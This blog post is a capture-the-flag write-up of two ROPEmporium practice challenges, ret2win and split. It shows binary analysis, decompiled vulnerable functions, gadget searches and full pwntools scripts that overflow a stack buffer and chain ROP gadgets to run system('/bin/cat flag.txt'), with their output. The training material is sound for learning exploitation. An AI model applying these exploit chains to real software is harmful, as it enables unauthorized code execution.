---
layout: post
title: ROPEmporium Part 1
date: 2023-12-15
categories: [Binary Exploitation, Return Oriented Programming]
tags: [ROP]
---


ROPEmporium is a series of eight challenges meant to teach return oriented programming in an isolated environment, where there is no need for reverse engineering or the exploitation of other bugs. Each challenge has four versions:

- x86_64
- x86
- ARMv5
- MIPS

In this post I will cover the x86_64 version of the first two challenges, the first being ret2win.

## ret2win

Our goal is to read the `flag.txt` file provided in the ZIP archive. Let's begin by taking a look at the binary

```
$ file ret2win

ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```

```
$ rabin2 -I ret2win

arch     x86
baddr    0x400000
binsz    6739
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

We see that NX is enabled, which is expected as that is the protection we need ROP to bypass. Let's run the file

```
$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Sure, here you go!
Thank you!

Exiting
```

So the binary asks for our input, specifying that it will try and fit 56 bytes of user input into a buffer of 32 bytes. Let's analyze the file in Ghidra and  see if the message is truthful

```cpp
undefined8 main(void)

{
    setvbuf(stdout,(char *)0x0,2,0);f
    puts("ret2win by ROP Emporium");
    puts("x86_64\n");
    pwnme();
    puts("\nExiting");
    return 0;
}
```

The main function prints two lines and calls `pwnme()`. Let's observe the `pwnme()` function

```cpp
void pwnme(void)

{
    undefined UserInput [32];
    
    memset(UserInput,0,0x20);
    puts(
            "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
            );
    puts("What could possibly go wrong?");
    puts(
            "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
            );
    printf("> ");
    read(0,UserInput,0x38);
    puts("Thank you!");
    return;
}
```

The binary was truthful, as our input is allocated a buffer of 32 bytes while the `read` function tries to read 0x38 bytes (56 in decimal). Obviously, this will result in a buffer overflow. 

Looking at the function list in Ghidra, we notice the `ret2win` function

```cpp
void ret2win(void)

{
    puts("Well done! Here\'s your flag:");
    system("/bin/cat flag.txt");
    return;
}
```

How convenient! If we can trick the binary into calling this function, we will get the flag. Let's see how many bytes we need to reach the saved return address. For this, we can use `pwngdb`

```
$ gdb ret2win

pwngdb> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

pwngdb>r

Starting program: /home/ret2win
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Thank you!
```

Looking at the registers, we see that RSP has been overwritten with `faaaaaaa`. This means that we need 40 bytes of filler to break the stack
![ESP register](/assets/Image10.png)

But first, let's look for a ROP gadget. We need a gadget because of a MOVAPS issue in Ubuntu 18.04, where this binary was compiled from. To achieve this we can use the `ROPgadget` tool. Sifting through the output, we notice this:

```
$ ROPgadget --binary ret2win

<SNIP>

0x000000000040053e : ret

<SNIP>
```

Finally, to create the exploit we will need to send:

- 40 bytes of filler in order to break the stack
- the address of the aforementioned ROP gadget
- the address of the `ret2win` function, which we want to call as to get the flag

For that we can use the pwntools library.

```python
from pwn import *

# Initialize the ELF
elf = ELF('ret2win')

# Start a new process using the binary file
process = process(elf.path)

# Create the payload with the 40 bytes of filler
payload = b'A' * 40

# Add the address of the ROP gadget to the payload
payload += p64(0x000000000040053e)

# We can use the pwntools elf utilities to get the address of the ret2win function, which we will then add to the payload
payload += p64(elf.sym.ret2win)

# Send the payload to the process
process.send(payload)

# Receive the output and decode it from bytes to string
output = process.recvall()
output = output.decode('utf-8')

# Find the index of the flag in the output
index = output.find('ROPE{')

# Print the flag
flag = output[index:]
print(flag)
```

Let's run the script and see what happens

```
$ python3 exploit_ret2win.py

[*] '/home/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/ret2win': pid 89708
[+] Receiving all data: Done (329B)
[*] Process '/home/ret2win' stopped with exit code 0 (pid 89708)
ROPE{a_placeholder_32byte_flag!}
```

Jackpot!


## split

I noticed that this challenge has the same flag as the previous one, so I decided to change it up. Again, we will start by inspecting the binary

```
$ file split

split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```

```
$ pwn checksec split

[*] '/home/andrei/Workshop/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Running the file, we are asked for our input

```
$ ./split

split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> ok!
Thank you!

Exiting
```

Opening the binary in Ghidra, we see that the main functions calls `pwnme` just like in the previous challenge. Looking at the `pwnme` function

```cpp
void pwnme(void)

{
   undefined UserInput [32];
   
   memset(UserInput,0,0x20);
   puts("Contriving a reason to ask user for data...");
   printf("> ");
   read(0,UserInput,0x60);
   puts("Thank you!");
   return;
}
```

The `read` function tries to read 0x60 bytes (96 in decimal) from our input, whose buffer is 32 bytes. Again, this will result in a buffer overflow. Taking a look at the symbol tree, we notice the `usefulFunction` function

```cpp
void usefulFunction(void)

{
   system("/bin/ls");
   return;
}
```

The function in question calls `system` to execute the `/bin/ls` command. However, by overwriting the argument of `system`, we can manipulate it to execute a different command. We can use `rabin2` to search for any useful strings in the binary.

```
$ rabin2 -z split

nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

Fortunately, we discover that the  `/bin/cat flag.txt` string is present in the file. If we overwrite the argument of `system` to this string, we get the flag. 

In order to achieve this we need to overwrite the RDI register, as that is where `system` expects its argument to be. Let's use `ROPgadget` to look for a gadget that may help us

```
$ ROPgadget --binary split

<SNIP>
0x00000000004007c3 : pop rdi ; ret

0x000000000040053e : ret
<SNIP>
```

Perfect! We found a gadget which pops a value from the stack into the RDI register. We also note the address of the `ret` gadget, which we will need to solve the MOVAPS issue. 

All in all, To create the exploit we will need:

- 40 bytes of filler
- the address of the `pop rdi ; ret` gadget
- the address of `/bin/cat flag.txt`
- the address of the `ret` gadget
- the address of the `system` function

```python
from pwn import *

# Initialize the ELF
elf = ELF('split')

# Start a new process using the binary file
process = process(elf.path)

# Create the payload with the 40 bytes of filler
payload = b'A' * 40

# Add the address of the "pop rdi ; ret" gadget
payload += p64(0x4007c3)

# Add the address of the "/bin/cat flag.txt" string
payload += p64(0x601060)

# Add the address of the "ret" gadget
payload += p64(0x40053e)

# We can use the pwntools elf utilities to get the address of the system function, which we will then add to the payload
payload += p64(elf.symbols["system"])

# Send the payload to the process
process.send(payload)

# Receive the output and decode it from bytes to string
output = process.recvall()
output = output.decode('utf-8')

# Find the index of the flag in the output
index = output.find('ROPE{')

# Print the flag
flag = output[index:]
print(flag)
```

Running the exploit...

```
$ python3 exploit_split.py      

[*] '/home/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './split': pid 145756
[+] Receiving all data: Done (108B)
[*] Stopped process './split' (pid 145756)
[+] b'ROPE{geet_dunked_on}'
```

Done!
